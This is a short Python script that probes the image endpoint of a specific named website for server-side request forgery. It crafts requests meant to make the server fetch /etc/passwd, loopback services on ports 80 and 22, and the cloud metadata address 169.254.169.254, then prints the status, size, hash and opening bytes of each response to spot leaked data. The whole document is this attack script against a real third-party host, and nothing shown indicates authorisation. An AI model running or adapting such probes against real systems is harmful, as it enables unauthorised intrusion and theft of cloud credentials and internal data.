import urllib.request,urllib.error,hashlib
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
B="https://www.infinitycapital.bh/_next/image"
legit=open("legit_q.txt").read().strip()
cases=[("legit",legit),
("passwd","?url=%2Fetc%2Fpasswd&w=100"),
("loopback80","?url=http%3A%2F%2F127.0.0.1%2F&w=100"),
("loopback22","?url=http%3A%2F%2F127.0.0.1%3A22%2F&w=100"),
("metadata","?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&w=100"),
("wonly","?w=1080&q=75"),
("nourl","")]
for l,q in cases:
    url=B+q
    try:
        r=urllib.request.urlopen(urllib.request.Request(url,headers={"User-Agent":UA}),timeout=25)
        b=r.read(); print(l,r.getcode(),len(b),hashlib.md5(b).hexdigest()[:8],dict(r.headers).get("Content-Type"),b[:100])
    except urllib.error.HTTPError as e:
        b=e.read(); print(l,e.code,len(b),hashlib.md5(b).hexdigest()[:8],dict(e.headers).get("Content-Type"),b[:100])
    except Exception as e: print(l,"ERR",e)
